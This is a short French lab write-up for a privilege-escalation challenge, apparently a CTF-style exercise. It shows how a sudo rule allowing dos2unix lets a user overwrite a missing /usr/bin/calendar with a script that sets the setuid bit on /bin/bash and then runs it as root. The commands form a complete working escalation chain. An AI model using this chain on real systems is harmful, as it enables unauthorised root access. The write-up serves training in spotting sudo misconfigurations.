# Privesc n°3

## Déploiement

```bash
sudo bash build.sh
```

## Writeup

```bash
$ sudo -l
User student may run the following commands on privesc1:
    (ALL) /usr/bin/dos2unix
    (ALL) /usr/bin/calendar
```

On peut lancer dos2unix et calendar en root.
On remarque que le fichier calendar n'existe pas.


On apprend sur gtfobin que dos2unix permet de faire un arbitrary write.
- https://gtfobins.github.io/gtfobins/dos2unix/

On va donc créer  un fake calendar pour utiliser la commande sudo pour le lancer. 

calendar : 

```bash
#!/bin/bash

chmod +s /bin/bash # or reverse shell or whatever
```

```bash
chmod +x calendar
sudo dos2unix -f -n calendar /usr/bin/calendar
sudo /usr/bin/calendar # done
```